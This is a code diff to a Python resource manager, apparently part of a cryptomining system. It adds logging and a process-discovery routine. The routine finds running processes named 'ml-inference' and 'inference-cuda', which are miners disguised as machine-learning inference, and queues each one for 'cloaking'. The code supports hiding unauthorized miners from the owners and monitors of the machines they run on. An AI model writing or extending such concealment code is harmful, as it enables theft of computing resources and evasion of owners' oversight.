@@ -389,7 +389,9 @@ class ResourceManager(IResourceManager):
             self.logger.info("🔌 Setting up essential EventBus subscriptions...")
             
             # ✅ CORE: Subscribe to mining events only - **FIXED EVENT NAMES** (tên sự kiện đã sửa)
+            self.logger.info("🔍 [DIAGNOSTIC] Subscribing to mining:cpu_pid_registered event")
             self.event_bus.subscribe('mining:cpu_pid_registered', self._on_cpu_mining_event)
+            self.logger.info("🔍 [DIAGNOSTIC] Subscribing to mining:gpu_pid_registered event")
             self.event_bus.subscribe('mining:gpu_pid_registered', self._on_gpu_mining_event)
             
             self.event_bus.start_listening()
@@ -753,6 +755,59 @@ class ResourceManager(IResourceManager):
 
         return metrics_data
 
+    def _discover_and_register_existing_processes(self) -> None:
+        """
+        🔍 PROCESS DISCOVERY: Scan system for existing mining processes and register them
+        Solves timing issue where processes start before ResourceManager is ready
+        """
+        import psutil
+        
+        target_processes = {
+            'ml-inference': False,  # CPU mining
+            'inference-cuda': True  # GPU mining  
+        }
+        
+        discovered_count = 0
+        
+        try:
+            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                try:
+                    proc_name = proc.info['name']
+                    if proc_name in target_processes:
+                        pid = proc.info['pid']
+                        is_gpu = target_processes[proc_name]
+                        
+                        self.logger.info(f"🔍 [PROCESS DISCOVERY] Found {proc_name} PID={pid} ({'GPU' if is_gpu else 'CPU'})")
+                        
+                        # Create MiningProcess object
+                        mining_process = MiningProcess(pid, proc_name, is_gpu=is_gpu)
+                        
+                        # Add to tracking list
+                        with self.mining_processes_lock:
+                            # Check if already exists
+                            existing = any(mp.pid == pid for mp in self.mining_processes)
+                            if not existing:
+                                self.mining_processes.append(mining_process)
+                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Added {proc_name} PID={pid} to tracking")
+                                
+                                # Enqueue for cloaking
+                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Enqueuing {proc_name} PID={pid} for cloaking")
+                                self.enqueue_cloaking(mining_process)
+                                discovered_count += 1
+                            else:
+                                self.logger.debug(f"🔍 [PROCESS DISCOVERY] {proc_name} PID={pid} already tracked, skipping")
+                                
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    # Skip processes that can't be accessed
+                    continue
+                except Exception as proc_err:
+                    self.logger.warning(f"🔍 [PROCESS DISCOVERY] Error processing {proc.info.get('name', 'unknown')}: {proc_err}")
+                    
+        except Exception as e:
+            self.logger.error(f"❌ [PROCESS DISCOVERY] Discovery failed: {e}")
+            
+        self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - discovered {discovered_count} mining processes")
+
     def start(self):
         self.logger.info("🚀 Starting ResourceManager (Ultra-Fast Non-Blocking Initialization)...")
         start_time = time.time()
@@ -811,6 +866,10 @@ class ResourceManager(IResourceManager):
 
             total_time = time.time() - start_time
             self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <5s)")
+            
+            # ✅ NEW: Process Discovery for existing mining processes
+            self.logger.info("🔍 [PROCESS DISCOVERY] Scanning for existing mining processes...")
+            self._discover_and_register_existing_processes()
             
             # Ultra-fast main loop với minimal monitoring
             self.logger.info("🔄 Entering minimal main monitoring loop...")
